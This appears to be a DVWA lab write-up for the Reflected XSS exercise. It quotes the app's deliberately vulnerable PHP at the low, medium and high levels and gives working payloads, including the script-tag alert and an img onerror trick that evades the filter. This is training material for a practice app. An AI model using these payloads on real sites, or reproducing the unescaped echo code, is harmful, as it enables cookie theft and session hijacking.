# DVWA - XSS (Reflected)

## Description

**Vulnerability:** XSS (Reflected)    
**Impact:** Leveraging XSS Scripting to get our desired data.

---

## LOW Security Level
The source code doesn't have any check:
```php
header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}
```
So similar to [XSS (DOM)](../xss-dom/README.md) we can use simple payload `<script>alert(document.cookie)</script>`

![Guide image](./screenshots/1.png)

## MEDIUM Security Level
This source code has new check on `<script>`:
```php
header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello {$name}</pre>";
}
```
So we can use the `img` trick: `<img src=x onerror=alert(document.cookie)>`

![Guide image](./screenshots/2.png)

## HIGH Security Level
This source now replaces all kinds of tag.
```php
header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello {$name}</pre>";
}
```
This code just prevents using `<script>` so the same payload as Medium Security Level will work: `<img src=x onerror=alert(document.cookie)>`

![Guide image](./screenshots/3.png)

## Resources
- https://owasp.org/www-community/attacks/xss/
- https://owasp.org/www-community/xss-filter-evasion-cheatsheet
- https://en.wikipedia.org/wiki/Cross-site_scripting
- https://www.cgisecurity.com/xss-faq.html
- https://www.scriptalert1.com/
